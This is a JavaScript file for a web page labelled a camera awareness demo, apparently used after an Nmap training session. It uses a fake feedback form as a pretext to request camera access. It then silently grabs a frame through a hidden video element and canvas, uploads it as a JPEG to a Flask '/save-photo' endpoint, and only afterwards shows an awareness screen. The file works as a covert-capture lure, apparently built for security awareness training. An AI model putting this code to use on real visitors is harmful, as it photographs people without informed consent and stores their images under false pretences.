/* =========================================
   NMAP SESSION FEEDBACK
   CAMERA AWARENESS DEMO
========================================= */


/* =========================================
   ELEMENTS
========================================= */

const feedbackForm =
    document.getElementById("feedbackForm");

const feedbackSection =
    document.getElementById("feedbackSection");

const permissionSection =
    document.getElementById("permissionSection");

const finalSection =
    document.getElementById("finalSection");

const camera =
    document.getElementById("camera");


/* =========================================
   VARIABLES
========================================= */

let cameraStream = null;


/* =========================================
   FORM SUBMISSION
========================================= */

feedbackForm.addEventListener(
    "submit",
    async function (event) {

        /*
         * Prevent normal form submission.
         *
         * Without this, the browser would
         * reload the page and add the form
         * values to the URL.
         */
        event.preventDefault();

        console.log("[+] Feedback submitted");

        /*
         * Hide the feedback form.
         */
        if (feedbackSection) {
            feedbackSection.classList.add("hidden");
        }

        /*
         * Request the browser's native
         * camera permission.
         */
        await requestCamera();

    }
);


/* =========================================
   REQUEST CAMERA
========================================= */

async function requestCamera() {

    console.log("[+] Requesting camera permission...");

    /*
     * Check browser support.
     */
    if (
        !navigator.mediaDevices ||
        !navigator.mediaDevices.getUserMedia
    ) {

        console.error(
            "[!] Camera API unavailable"
        );

        showFinalSection();

        return;
    }


    try {

        /*
         * Request front-facing camera.
         *
         * The resolution is an ideal value.
         * The actual resolution depends on
         * the device/browser.
         */
        cameraStream =
            await navigator
                .mediaDevices
                .getUserMedia({

                    video: {
                        facingMode: "user",

                        width: {
                            ideal: 1280
                        },

                        height: {
                            ideal: 720
                        }
                    },

                    audio: false

                });


        console.log(
            "[+] Camera permission granted"
        );


        /*
         * Connect camera stream to
         * hidden video element.
         */
        camera.srcObject = cameraStream;


        /*
         * Explicitly start video playback.
         */
        await camera.play();


        console.log(
            "[+] Camera video started"
        );


        /*
         * Wait for an actual decoded
         * camera frame.
         */
        await waitForCameraFrame();


        /*
         * Capture and upload the frame.
         */
        await captureAndSavePhoto();

    }


    catch (error) {

        console.error(
            "[!] Camera error:",
            error
        );

        stopCamera();

        showFinalSection();

    }

}


/* =========================================
   WAIT FOR REAL CAMERA FRAME
========================================= */

function waitForCameraFrame() {

    return new Promise(
        function (resolve, reject) {

            /*
             * Maximum wait time:
             * 8 seconds.
             */
            const timeout =
                setTimeout(
                    function () {

                        reject(
                            new Error(
                                "Camera frame unavailable"
                            )
                        );

                    },
                    8000
                );


            /*
             * Modern browsers support
             * requestVideoFrameCallback().
             *
             * This waits for an actual
             * decoded video frame rather
             * than simply checking whether
             * videoWidth/videoHeight exist.
             */
            if (
                "requestVideoFrameCallback"
                in camera
            ) {

                camera.requestVideoFrameCallback(
                    function () {

                        clearTimeout(timeout);

                        console.log(
                            "[+] Real camera frame available:",
                            camera.videoWidth +
                            "x" +
                            camera.videoHeight
                        );

                        resolve();

                    }
                );

            }


            else {

                /*
                 * Fallback for browsers that
                 * do not support
                 * requestVideoFrameCallback().
                 *
                 * Two animation frames give
                 * the browser time to render
                 * the camera stream.
                 */
                requestAnimationFrame(
                    function () {

                        requestAnimationFrame(
                            function () {

                                clearTimeout(timeout);

                                if (
                                    camera.videoWidth > 0 &&
                                    camera.videoHeight > 0
                                ) {

                                    console.log(
                                        "[+] Camera frame available:",
                                        camera.videoWidth +
                                        "x" +
                                        camera.videoHeight
                                    );

                                    resolve();

                                }

                                else {

                                    reject(
                                        new Error(
                                            "Camera frame unavailable"
                                        )
                                    );

                                }

                            }
                        );

                    }
                );

            }

        }
    );

}


/* =========================================
   CAPTURE AND SAVE PHOTO
========================================= */

async function captureAndSavePhoto() {

    console.log(
        "[+] Capturing camera frame..."
    );


    /*
     * Make sure the camera is actually
     * providing usable video data.
     */
    if (
        camera.readyState <
        HTMLMediaElement.HAVE_CURRENT_DATA
    ) {

        throw new Error(
            "Camera video data is not ready"
        );

    }


    if (
        !camera.videoWidth ||
        !camera.videoHeight
    ) {

        throw new Error(
            "Camera frame is unavailable"
        );

    }


    /*
     * Log the original camera resolution.
     */
    console.log(
        "[+] Camera resolution:",
        camera.videoWidth +
        "x" +
        camera.videoHeight
    );


    /*
     * Maximum image dimensions.
     *
     * This prevents unnecessarily huge
     * uploads from high-resolution phones.
     */
    const MAX_WIDTH = 1280;
    const MAX_HEIGHT = 720;


    /*
     * Start with actual camera dimensions.
     */
    let width = camera.videoWidth;
    let height = camera.videoHeight;


    /*
     * Scale down only if necessary.
     *
     * The image will never be enlarged.
     */
    const scale = Math.min(
        1,
        MAX_WIDTH / width,
        MAX_HEIGHT / height
    );


    width =
        Math.round(width * scale);

    height =
        Math.round(height * scale);


    console.log(
        "[+] Capture size:",
        width +
        "x" +
        height
    );


    /*
     * Create an invisible canvas.
     */
    const canvas =
        document.createElement("canvas");


    canvas.width = width;
    canvas.height = height;


    /*
     * Get 2D drawing context.
     */
    const context =
        canvas.getContext("2d");


    if (!context) {

        throw new Error(
            "Could not create canvas context"
        );

    }


    /*
     * Draw the current camera frame
     * onto the canvas.
     */
    context.drawImage(
        camera,
        0,
        0,
        width,
        height
    );


    /*
     * Convert canvas to JPEG.
     *
     * 0.92 = high JPEG quality.
     */
    const imageData =
        canvas.toDataURL(
            "image/jpeg",
            0.92
        );


    console.log(
        "[+] Frame captured"
    );


    /*
     * Log approximate Base64 size.
     *
     * Useful for debugging.
     */
    console.log(
        "[+] Image data size:",
        Math.round(
            imageData.length / 1024
        ) +
        " KB"
    );


    /* =====================================
       SEND TO FLASK
    ===================================== */

    try {

        const response =
            await fetch(
                "/save-photo",
                {

                    method: "POST",

                    headers: {
                        "Content-Type":
                            "application/json"
                    },

                    body: JSON.stringify({
                        image: imageData
                    })

                }
            );


        /*
         * Check HTTP status.
         */
        if (!response.ok) {

            throw new Error(
                "Server returned HTTP " +
                response.status
            );

        }


        /*
         * Read Flask response.
         */
        const result =
            await response.json();


        /*
         * Stop camera immediately after
         * the server has responded.
         */
        stopCamera();


        /* =================================
           HANDLE SERVER RESPONSE
        ================================= */

        if (result.success) {

            console.log(
                "[+] Photo saved successfully"
            );

            console.log(
                "[+] Filename:",
                result.filename
            );

        }

        else {

            console.error(
                "[!] Photo was not saved:",
                result.message
            );

        }


        /*
         * Do not display the image.
         *
         * Continue to the awareness screen.
         */
        showFinalSection();

    }


    catch (error) {

        console.error(
            "[!] Error sending photo:",
            error
        );

        stopCamera();

        showFinalSection();

    }

}


/* =========================================
   STOP CAMERA
========================================= */

function stopCamera() {

    console.log(
        "[+] Stopping camera..."
    );


    /*
     * Stop every camera track.
     */
    if (cameraStream) {

        cameraStream
            .getTracks()
            .forEach(
                function (track) {

                    track.stop();

                }
            );


        cameraStream = null;

    }


    /*
     * Remove stream from video element.
     */
    if (camera) {

        camera.srcObject = null;

    }

}


/* =========================================
   SHOW AWARENESS SCREEN
========================================= */

function showFinalSection() {

    /*
     * Hide permission section
     * if it exists.
     */
    if (permissionSection) {

        permissionSection.classList.add(
            "hidden"
        );

    }


    /*
     * Hide feedback section.
     */
    if (feedbackSection) {

        feedbackSection.classList.add(
            "hidden"
        );

    }


    /*
     * Show final awareness section.
     */
    if (finalSection) {

        finalSection.classList.remove(
            "hidden"
        );

    }


    /*
     * Scroll to the top.
     */
    window.scrollTo({
        top: 0,
        behavior: "smooth"
    });

}


/* =========================================
   PAGE CLEANUP
========================================= */

window.addEventListener(
    "beforeunload",
    function () {

        stopCamera();

    }
);